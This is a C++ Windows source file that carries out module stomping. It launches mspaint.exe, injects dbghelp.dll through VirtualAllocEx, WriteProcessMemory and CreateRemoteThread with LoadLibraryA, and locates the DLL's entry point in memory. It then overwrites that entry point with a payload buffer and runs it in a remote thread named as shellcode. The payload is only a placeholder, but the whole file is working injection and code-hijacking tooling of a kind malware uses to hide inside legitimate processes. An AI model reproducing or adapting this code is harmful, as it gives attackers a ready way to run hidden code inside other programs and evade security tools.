#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <Psapi.h>
#include <memory>
#include "log.hpp"
#include <string>
#include <fstream>
#include <vector>


int dll_entrypoint(const CHAR* path)
{
	std::ifstream file(path, std::ios::binary);
	if (!file) {
		log("Couldn't open %s", path);
		return 1;
	}

	file.seekg(0, std::ios::end);
	std::streampos size = file.tellg();
	file.seekg(0, std::ios::beg);

	std::vector<char> buffer(size);
	if (!file.read(buffer.data(), size)) {
		log("Couldn't' read %s", path);
		return 1;
	}

	log("File is %u bytes", (unsigned int)size);

	auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(buffer.data());
	if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
		log("Invalid DOS signature");
		return 1;
	}

	auto nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(buffer.data() + dos_header->e_lfanew);
	if (nt_headers->Signature != IMAGE_NT_SIGNATURE) {
		log("Invalid NT signature");
		return 1;
	}

	auto optional_header = &nt_headers->OptionalHeader;
	if (optional_header->Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC) {
		log("Invalid optional header magic");
		return 1;
	}

	auto entry_point = optional_header->AddressOfEntryPoint;
	return entry_point;
}

int inject_dll(HANDLE process_handle, std::string library_path) {
	auto kernel32 = GetModuleHandleA("kernel32.dll");
	LPVOID load_library_address = nullptr;
	if (kernel32) {
		load_library_address = GetProcAddress(kernel32, "LoadLibraryA");
	}
	else {
		log("Couldn't get kernel32 handle");
		return 1;
	}

	log("LoadLibraryA address: %p", load_library_address);

	auto path_remote_buffer = VirtualAllocEx(process_handle, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!path_remote_buffer)
	{
		log("Couldn't allocate memory in process");
		return 1;
	}

	log("Allocated memory in process: %p", path_remote_buffer);

	SIZE_T bytesWritten = 0;
	if (!WriteProcessMemory(process_handle, path_remote_buffer, library_path.c_str(), library_path.length(), &bytesWritten))
	{
		log("Couldn't write to process memory");
		return 1;
	}
	log("Wrote %d bytes to process memory", bytesWritten);

	auto remote_thread = CreateRemoteThread(process_handle, nullptr, 0, (LPTHREAD_START_ROUTINE)load_library_address, path_remote_buffer, 0, nullptr);

	if (!remote_thread) {
		log("Couldn't create remote thread");
		return 1;
	}

	log("Created remote thread: %p", remote_thread);
	WaitForSingleObject(remote_thread, INFINITE);
	return 0;
}
int main()
{
	unsigned char payload[] = "0xCC";

	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	CHAR command_line[] = "mspaint.exe";
	CHAR library_path[] = "C:\\Windows\\System32\\dbghelp.dll";
	if (!CreateProcessA(nullptr, command_line, nullptr, nullptr, 0, 0, nullptr, nullptr, &si, &pi))
	{
		log("Couldn't start process");
		return 1;
	};
	log("Started process: %u", pi.dwProcessId);

	if (inject_dll(pi.hProcess, library_path) == 1) {
		log("Couldn't inject dll");
		return 1;
	}

	DWORD needed = 0;
	EnumProcessModules(pi.hProcess, nullptr, 0, &needed);
	auto modules = std::make_unique<HMODULE[]>(needed / sizeof(HMODULE));
	EnumProcessModules(pi.hProcess, modules.get(), needed, &needed);


	LPVOID module_base_address = nullptr;
	for (size_t i = 0; i < needed / sizeof(HMODULE); i++)
	{
		char module_name[MAX_PATH];
		GetModuleFileNameExA(pi.hProcess, modules[i], module_name, sizeof(module_name));
		if (std::string(module_name).find(library_path) != std::string::npos) {
			log("Module: %s", module_name);
			module_base_address = modules[i];
			break;
		}
	}

	if (!module_base_address) {
		log("Couldn't find module");
		return 1;
	}

	auto entry_point_address = dll_entrypoint(library_path);
	log("Entry point address: %p", entry_point_address);

	auto entry_point_remote = reinterpret_cast<LPVOID>(reinterpret_cast<DWORD_PTR>(module_base_address) + entry_point_address);
	log("Entry point remote: %p", entry_point_remote);

	WriteProcessMemory(pi.hProcess, entry_point_remote, payload, sizeof(payload), nullptr);

	auto shellcode_thread = CreateRemoteThread(pi.hProcess, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(entry_point_remote), nullptr, 0, nullptr);

	if (!shellcode_thread) {
		log("Couldn't create shellcode thread");
		return 1;
	}

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	return 0;
}